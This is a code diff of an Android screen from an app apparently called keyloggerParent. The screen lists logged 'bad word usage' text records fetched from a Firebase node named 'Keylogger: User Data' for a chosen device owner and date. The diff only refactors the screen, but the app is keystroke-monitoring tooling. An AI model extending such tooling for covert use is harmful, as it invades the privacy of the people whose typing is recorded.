@@ -1,11 +1,13 @@
 package com.maemresen.infsec.keyloggerParent;
 
+import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
+import android.widget.TextView;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
@@ -28,10 +30,10 @@ import java.util.List;
 import java.util.Locale;
 
 public class CaughtUsingBadWordsFragment extends Fragment {
-    private DatabaseReference badwordsRef;
+    private DatabaseReference allRecordsRef;
     private RecyclerView recyclerView;
     private BadWordsAdapter adapter;
-    private List<String> badWordsList;
+    private List<String> textRecordsList;
     
     private LottieAnimationView loadingAnimationView;
     private boolean isLoading;
@@ -41,37 +43,48 @@ public class CaughtUsingBadWordsFragment extends Fragment {
     public View onCreateView( @NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState ) {
         View rootView = inflater.inflate( R.layout.badwords_detection_layout, container, false );
         
+        
         recyclerView = rootView.findViewById( R.id.BadWordsRecycler );
         recyclerView.setLayoutManager( new LinearLayoutManager( getContext() ) );
-        badWordsList = new ArrayList<>();
-        adapter = new BadWordsAdapter( badWordsList );
+        textRecordsList = new ArrayList<>();
+        adapter = new BadWordsAdapter( textRecordsList );
         recyclerView.setAdapter( adapter );
-        loadingAnimationView = rootView.findViewById( R.id.loadingAnimationView );
+        loadingAnimationView = rootView.findViewById( R.id.animationBadWordUsage );
         
-        // Set the animation resource
         loadingAnimationView.setAnimation( R.raw.skeleton_card );
         // Set the animation loop and start
         loadingAnimationView.setRepeatCount( LottieDrawable.INFINITE );
         loadingAnimationView.playAnimation();
+    
+        String ownerName = "";
+        String selectedDate = "";
+        Bundle bundle = getArguments();
+        if (bundle != null) {
+            ownerName = bundle.getString( "OWNER_NAME" );
+            selectedDate = bundle.getString( "SELECTED_DATE" );
+        }
+    
+        UpdateFragment( ownerName, selectedDate );
         
-        Date now = DateTimeHelper.getCurrentDay();
-        SimpleDateFormat dateFormat = new SimpleDateFormat( "dd-MM-yyyy", Locale.getDefault() );
-        String databaseName = dateFormat.format( now );
-        String ownerName = Build.MODEL;
-        badwordsRef = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
+        return rootView;
+    }
+    
+    public void UpdateFragment(String ownerName,String databaseName){
+        
+        allRecordsRef = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                 .child( ownerName )
                 .child( databaseName )
                 .child( "Bad Word Usage" );
         
         // Add a ValueEventListener to listen for changes in the data
-        badwordsRef.addValueEventListener( new ValueEventListener() {
+        allRecordsRef.addValueEventListener( new ValueEventListener() {
             @Override
             public void onDataChange( @NonNull DataSnapshot dataSnapshot ) {
-                badWordsList.clear();
+                textRecordsList.clear();
                 
-                for (DataSnapshot badWordSnapshot : dataSnapshot.getChildren()) {
-                    String badWord = badWordSnapshot.getValue( String.class );
-                    badWordsList.add( badWord );
+                for (DataSnapshot textRecordSnapshot : dataSnapshot.getChildren()) {
+                    String textRecord = textRecordSnapshot.getValue( String.class );
+                    textRecordsList.add( textRecord );
                 }
                 
                 // Notify the adapter that the data has changed
@@ -88,8 +101,6 @@ public class CaughtUsingBadWordsFragment extends Fragment {
             }
             
         } );
-        
-        return rootView;
     }
     
     @Override
